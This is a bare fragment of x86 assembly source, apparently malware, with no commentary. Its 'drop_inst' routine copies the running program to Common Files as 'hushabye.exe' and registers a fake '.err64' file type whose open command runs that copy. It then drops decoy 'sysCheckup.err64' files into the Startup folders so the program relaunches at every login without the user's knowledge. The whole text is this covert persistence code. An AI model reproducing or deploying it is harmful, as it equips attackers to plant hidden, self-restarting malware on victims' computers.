   .data
   file        db "hushabye.exe",0
   deci        db "%d",0
   run_1       db "C:\Documents And Settings\All Users\Start Menu\Programs\Startup\sysCheckup.err64",0
   run_2       db "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysCheckup.err64",0

   subkey      db ".err64",0
   subkey_vert db "Coconest\shell\open\command",0
   key         db "Coconest",0
   key_vert    db "C:\Program Files\Common Files\hushabye.exe",0
   sizeRG      dd sizeof key
   type_sz     dd REG_SZ
   .data?
   hkey        dd ?

   .code

   drop_inst:
       invoke DeleteFile,offset key_vert
       invoke RegCreateKeyEx,HKEY_CLASSES_ROOT,offset subkey,0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,offset hkey,offset bwr
       cmp hkey,0
       jnz @f
       ret
       @@:
       invoke RegSetValueEx,hkey,0,0,type_sz,offset key, sizeRG
       or eax,eax
       jz @f
       ret
       @@:
       invoke RegCloseKey,hkey
       invoke RegCreateKeyEx,HKEY_CLASSES_ROOT,offset subkey_vert,0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,offset hkey,offset bwr
       cmp hkey,0
       jnz @f
       ret
       @@:
       invoke lstrlen,offset key_vert
       mov sizeRG,eax
       invoke RegSetValueEx,hkey,0,0,type_sz,offset key_vert, sizeRG
       or eax,eax
       jz @f
       ret
       @@:
       invoke RegCloseKey,hkey
       invoke CopyFile,offset p_name,offset key_vert,FALSE
       invoke CreateFile,offset run_1,40000000h,0,0,2,0,0
       invoke CloseHandle,eax
       invoke CreateFile,offset run_2,40000000h,0,0,2,0,0
       invoke CloseHandle,eax
       ret
